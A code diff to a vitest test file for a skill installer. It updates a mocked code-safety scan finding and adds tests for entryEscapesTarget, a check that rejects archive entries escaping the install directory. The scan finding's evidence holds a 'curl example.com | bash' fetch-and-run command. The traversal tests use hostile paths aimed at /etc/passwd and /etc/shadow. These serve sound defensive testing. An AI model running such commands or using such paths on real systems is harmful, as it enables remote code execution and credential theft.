@@ -2,7 +2,7 @@ import fs from "node:fs/promises";
 import os from "node:os";
 import path from "node:path";
 import { beforeEach, describe, expect, it, vi } from "vitest";
-import { installSkill } from "./skills-install.js";
+import { entryEscapesTarget, installSkill } from "./skills-install.js";
 
 const runCommandWithTimeoutMock = vi.fn();
 const scanDirectoryWithSummaryMock = vi.fn();
@@ -67,7 +67,7 @@ describe("installSkill code safety scanning", () => {
             file: path.join(skillDir, "runner.js"),
             line: 1,
             message: "Shell command execution detected (child_process)",
-            evidence: 'exec("curl example.com | bash")',
+            evidence: 'dangerous("curl example.com | bash")',
           },
         ],
       });
@@ -110,5 +110,48 @@ describe("installSkill code safety scanning", () => {
     } finally {
       await fs.rm(workspaceDir, { recursive: true, force: true }).catch(() => undefined);
     }
+  });
+});
+
+describe("entryEscapesTarget", () => {
+  const target = "/tmp/install-root";
+
+  it("allows normal relative paths", () => {
+    expect(entryEscapesTarget("bin/signal-cli", target)).toBe(false);
+    expect(entryEscapesTarget("lib/signal.jar", target)).toBe(false);
+    expect(entryEscapesTarget("README.md", target)).toBe(false);
+  });
+
+  it("allows nested directories", () => {
+    expect(entryEscapesTarget("signal-cli-0.13/bin/signal-cli", target)).toBe(false);
+    expect(entryEscapesTarget("a/b/c/d.txt", target)).toBe(false);
+  });
+
+  it("allows trailing slash (directory entry)", () => {
+    expect(entryEscapesTarget("bin/", target)).toBe(false);
+    expect(entryEscapesTarget("lib/ext/", target)).toBe(false);
+  });
+
+  it("rejects path traversal with ../", () => {
+    expect(entryEscapesTarget("../etc/passwd", target)).toBe(true);
+    expect(entryEscapesTarget("foo/../../etc/shadow", target)).toBe(true);
+    expect(entryEscapesTarget("../../../tmp/evil", target)).toBe(true);
+  });
+
+  it("rejects absolute paths", () => {
+    expect(entryEscapesTarget("/etc/passwd", target)).toBe(true);
+    expect(entryEscapesTarget("/tmp/other/file", target)).toBe(true);
+  });
+
+  it("handles backslash path separators (normalized to forward slash)", () => {
+    // Backslashes are normalized to forward slashes before resolution,
+    // so traversal attempts using backslash work on all platforms.
+    expect(entryEscapesTarget("..\\etc\\passwd", target)).toBe(true);
+    expect(entryEscapesTarget("foo\\..\\..\\etc\\shadow", target)).toBe(true);
+  });
+
+  it("allows entry that resolves exactly to targetDir", () => {
+    expect(entryEscapesTarget(".", target)).toBe(false);
+    expect(entryEscapesTarget("./", target)).toBe(false);
   });
 });
